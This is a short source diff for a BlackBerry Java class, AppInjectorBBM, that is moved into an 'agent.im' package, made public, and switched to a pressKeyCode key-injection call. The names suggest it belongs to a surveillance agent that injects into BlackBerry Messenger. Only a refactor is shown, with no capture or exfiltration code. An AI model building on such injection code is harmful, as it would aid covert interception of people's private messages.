@@ -1,15 +1,16 @@
-package blackberry.injection;
+package blackberry.agent.im;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
-import blackberry.agent.im.BBMMenuItem;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.injection.AppInjectorInterface;
+import blackberry.injection.KeyInjector;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.Utils;
 
-class AppInjectorBBM implements AppInjectorInterface, Singleton {
+public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
     //#endif
@@ -57,7 +58,7 @@ class AppInjectorBBM implements AppInjectorInterface, Singleton {
         menu.addMenuBBM();
 
         Utils.sleep(100);
-        KeyInjector.pressKey(Keypad.KEY_MENU);
+        KeyInjector.pressKeyCode(Keypad.KEY_MENU);
         Utils.sleep(100);
 
         debug.trace("  messenger active screen: "
